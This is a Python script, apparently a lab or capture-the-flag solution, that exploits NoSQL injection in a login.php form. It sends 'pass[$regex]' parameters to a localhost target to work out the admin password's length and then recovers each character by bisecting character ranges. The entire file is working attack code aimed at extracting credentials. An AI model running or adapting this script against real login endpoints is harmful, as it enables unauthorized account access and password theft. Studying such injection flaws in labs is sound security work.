from string import ascii_lowercase, ascii_uppercase, digits
import requests

url = "http://127.0.0.1/"
user = "admin"

len_of_pass = 0
password = "^$"


def get_chr(password,Data,i):
    while True:
        B = 0
        regex = password[:0+i] +  f"[{Data[0]}-{Data[len(Data)//2]}]" + password[1+i:]
        req = requests.post(url + "/login.php", data={"user": user, "pass[$regex]" : regex})
        if user in req.text:
            B = 1
        regex = password[:0+i] +  f"[{Data[len(Data)//2]}-{Data[-1]}]" + password[1+i:]
        req = requests.post(url + "/login.php", data={"user": user, "pass[$regex]" : regex})
        if user in req.text:
            B = 0
        if B :
            Data = Data[:len(Data)//2]
        else :
            Data = Data[len(Data)//2:]
        if len(Data) == 1:
            password = password[:0+i] + Data + password[1+i:]
            return password

def get_dataType(i):
        # password is Digit
    regex = password[:0+i] +  f"[{digits[0]}-{digits[-1]}]" + password[1+i:]
    req = requests.post(url + "/login.php", data={"user": user, "pass[$regex]" : regex})
    if user in req.text :
        return digits

    # password lowercase
    regex = password[:0+i] + f"[{ascii_lowercase[0]}-{ascii_lowercase[-1]}]" + password[1+i:]
    req = requests.post(url + "/login.php", data={"user": user, "pass[$regex]" : regex})
    if user in req.text :
        return ascii_lowercase

    # password upper
    regex = password[:0+i] + f"[{ascii_uppercase[0]}-{ascii_uppercase[-1]}]" + password[1+i:]
    req = requests.post(url + "/login.php", data={"user": user, "pass[$regex]" : regex})
    if user in req.text :
        return ascii_uppercase


while True:
    password = password[0] + len_of_pass*"." + password[-1]
    req = requests.post(url + "/login.php", data={"user": user, "pass[$regex]" : password})
    if user in req.text:
        print("leanth of password is: " + str(len_of_pass))
        break
    len_of_pass += 1

for i in range(1,len_of_pass+1):

    Data = get_dataType(i)
    password = get_chr(password,Data,i)
    print(password[1:-1])
